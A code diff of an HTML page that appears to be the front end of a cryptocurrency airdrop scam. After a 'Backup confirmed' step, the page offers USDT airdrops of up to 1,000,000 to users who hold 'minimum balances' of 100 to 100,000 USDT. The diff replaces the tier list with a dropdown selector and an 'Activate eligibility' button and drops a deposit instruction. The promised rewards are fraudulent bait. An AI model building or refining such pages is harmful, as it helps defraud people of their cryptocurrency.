@@ -169,24 +169,26 @@ header .logo img {
     ✔ Backup confirmed — now let’s activate your vault eligibility.
   </p>
   <p class="subtitle">
-    This is a one-time vault entry. You may only choose one airdrop tier.
+    This is a one-time vault entry. Please select your airdrop tier.
   </p>
 
-  <ul style="margin-top: 16px; padding-left: 16px; line-height: 1.6;">
-    <li>For <strong>1,000,000 USDT</strong> airdrop → Minimum balance: <strong>100,000 USDT</strong></li>
-    <li>For <strong>250,000 USDT</strong> airdrop → Minimum balance: <strong>50,000 USDT</strong></li>
-    <li>For <strong>100,000 USDT</strong> airdrop → Minimum balance: <strong>20,000 USDT</strong></li>
-    <li>For <strong>50,000 USDT</strong> airdrop → Minimum balance: <strong>10,000 USDT</strong></li>
-    <li>For <strong>30,000 USDT</strong> airdrop → Minimum balance: <strong>5,000 USDT</strong></li>
-    <li>For <strong>8,800 USDT</strong> airdrop → Minimum balance: <strong>1,500 USDT</strong></li>
-    <li>For <strong>2,900 USDT</strong> airdrop → Minimum balance: <strong>400 USDT</strong></li>
-    <li>For <strong>1,200 USDT</strong> airdrop → Minimum balance: <strong>250 USDT</strong></li>
-    <li>For <strong>600 USDT</strong> airdrop → Minimum balance: <strong>100 USDT</strong></li>
-  </ul>
+  <label for="tierSelect" style="margin-top: 12px; display:block; color:#cbd5e1;">
+    Choose a tier:
+  </label>
+  <select id="tierSelect" name="tierSelect">
+    <option value="">-- Select a tier --</option>
+    <option value="1M">1,000,000 USDT airdrop → Min balance: 100,000 USDT</option>
+    <option value="250k">250,000 USDT airdrop → Min balance: 50,000 USDT</option>
+    <option value="100k">100,000 USDT airdrop → Min balance: 20,000 USDT</option>
+    <option value="50k">50,000 USDT airdrop → Min balance: 10,000 USDT</option>
+    <option value="30k">30,000 USDT airdrop → Min balance: 5,000 USDT</option>
+    <option value="8.8k">8,800 USDT airdrop → Min balance: 1,500 USDT</option>
+    <option value="2.9k">2,900 USDT airdrop → Min balance: 400 USDT</option>
+    <option value="1.2k">1,200 USDT airdrop → Min balance: 250 USDT</option>
+    <option value="600">600 USDT airdrop → Min balance: 100 USDT</option>
+  </select>
 
-  <p class="muted" style="margin-top: 20px;">
-    Please deposit the required balance into your wallet. Once confirmed, your vault reward will be auto credited within 24 hours.
-  </p>
+  <button id="s3btn" style="margin-top: 16px;">Activate eligibility</button>
     </div>
 
     <div id="final" class="card" hidden role="region" aria-labelledby="ftitle">
